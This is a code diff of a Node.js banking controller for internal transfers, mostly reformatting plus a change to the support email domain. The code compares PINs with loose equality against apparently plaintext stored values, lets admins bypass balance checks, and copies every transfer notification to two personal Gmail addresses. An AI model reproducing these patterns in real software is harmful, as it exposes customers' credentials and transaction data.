@@ -15,9 +15,7 @@ const createInternalTransfer = async (req, res) => {
         .status(404)
         .json({ status: "failed", error: "User not found" });
     }
-    const validPin = user.pin == req.body.pin
-
-
+    const validPin = user.pin == req.body.pin;
 
     if (!validPin) {
       return res
@@ -25,15 +23,17 @@ const createInternalTransfer = async (req, res) => {
         .json({ status: "unauthorized", error: "Invalid PIN" });
     }
 
-    if(req.user.role !== 'admin') {
- if(user.savings_balance < req.body.amount || user.savings_balance === 0 ) {
-      return res
-        .status(401)
-        .json({ status: "unauthorized", error: "insufficient balance" });
+    if (req.user.role !== "admin") {
+      if (
+        user.savings_balance < req.body.amount ||
+        user.savings_balance === 0
+      ) {
+        return res
+          .status(401)
+          .json({ status: "unauthorized", error: "insufficient balance" });
+      }
     }
-    }
- 
-   
+
     const internalTransfer = await InternalTransfer.create(req.body);
 
     const subject = "Transfer Request";
@@ -105,7 +105,7 @@ const createInternalTransfer = async (req, res) => {
             <li>Use strong, unique passwords for your online banking.</li>
           </ul>
 
-          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>
+          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodcapitalscp.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>
 
           <div class="footer">
             <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
@@ -117,13 +117,11 @@ const createInternalTransfer = async (req, res) => {
 </body>
 </html>`;
 
-     await Promise.all([
-       sendEmail(user.email, subject, text, html),
-       sendEmail("anniemary841@gmail.com", subject, text, html),
-       sendEmail("companychris00@gmail.com", subject, text, html),
-     ]);
-
-
+    await Promise.all([
+      sendEmail(user.email, subject, text, html),
+      sendEmail("anniemary841@gmail.com", subject, text, html),
+      sendEmail("companychris00@gmail.com", subject, text, html),
+    ]);
 
     res.status(200).json({
       status: "success",
@@ -139,7 +137,9 @@ const createInternalTransfer = async (req, res) => {
 
 const getUserInternalTransfer = async (req, res) => {
   try {
-    const userInternalTransfer = await InternalTransfer.find({ user: req.user.userId });
+    const userInternalTransfer = await InternalTransfer.find({
+      user: req.user.userId,
+    });
     res.status(200).json({
       status: "success",
       nbHits: userInternalTransfer.length,
